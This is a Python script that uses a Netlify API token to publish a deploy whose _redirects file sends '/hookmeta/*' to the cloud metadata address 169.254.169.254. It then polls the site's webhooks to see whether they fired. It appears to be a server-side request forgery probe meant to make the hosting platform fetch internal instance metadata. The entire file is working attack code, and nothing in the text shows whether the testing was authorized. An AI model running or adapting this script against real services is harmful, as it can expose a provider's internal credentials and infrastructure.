# -*- coding: utf-8 -*-
# _hk_trigger.py - query hook types; trigger deploy; poll hook success fields
import sys, os, json, time, hashlib, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_B

SITE_B = "d2977de0-d24d-4544-81cb-933e610cad7d"
API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, raw_body=None, ctype=None, timeout=40):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if raw_body is not None:
        data = raw_body
        r.add_header("Content-Type", ctype or "application/octet-stream")
    elif body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(40000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:1000]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:300]

# 1. hook types
s, b = req("GET", API + "/hooks/types", tok=TOKEN_B)
print("hook types:", s, json.dumps(b, ensure_ascii=False)[:1500] if isinstance(b, (dict, list)) else repr(b)[:300])

ids = json.load(open(r"D:\scan\netlify_report\_hk_ids.txt"))
print("hook ids:", ids)

# 2. trigger a new deploy (content change)
html2 = b"<html><body>hooktest-trigger-2</body></html>"
redir2 = b"/hookmeta/*  https://169.254.169.254/latest/meta-data/  302\n/hookctl/*  /index.html  302\n"
files = {"/index.html": hashlib.sha1(html2).hexdigest(),
         "/_redirects": hashlib.sha1(redir2).hexdigest()}
s, d = req("POST", API + "/sites/%s/deploys" % SITE_B, tok=TOKEN_B,
           body={"title": "hook-trigger-2", "files": files})
print("create deploy2:", s, (d.get("id"), d.get("state")) if isinstance(d, dict) else repr(d)[:200])
if isinstance(d, dict) and d.get("id"):
    DID = d["id"]
    for path, content in (("/index.html", html2), ("/_redirects", redir2)):
        req("PUT", API + "/deploys/%s/files%s" % (DID, path), tok=TOKEN_B,
            raw_body=content, ctype="application/octet-stream")
    s, dd = req("PUT", API + "/sites/%s/deploys/%s" % (SITE_B, DID), tok=TOKEN_B, body={"state": "published"})
    print("publish2:", s, dd.get("state") if isinstance(dd, dict) else repr(dd)[:200])

# 3. poll hook states
for i in range(8):
    time.sleep(5)
    out = []
    for name, hid in (("meta", ids.get("meta")), ("ctl", ids.get("ctl"))):
        s, h = req("GET", API + "/hooks/%s" % hid, tok=TOKEN_B)
        if isinstance(h, dict):
            out.append("%s: success=%r disabled=%r updated=%s" % (name, h.get("success"), h.get("disabled"), h.get("updated_at")))
        else:
            out.append("%s: %s %r" % (name, s, h))
    print("poll %d: %s" % (i, " | ".join(out)), flush=True)
    # stop when both success non-null
    done = True
    for name, hid in (("meta", ids.get("meta")), ("ctl", ids.get("ctl"))):
        s, h = req("GET", API + "/hooks/%s" % hid, tok=TOKEN_B)
        if isinstance(h, dict) and h.get("success") is None:
            done = False
    if done:
        print("both hooks fired")
        break
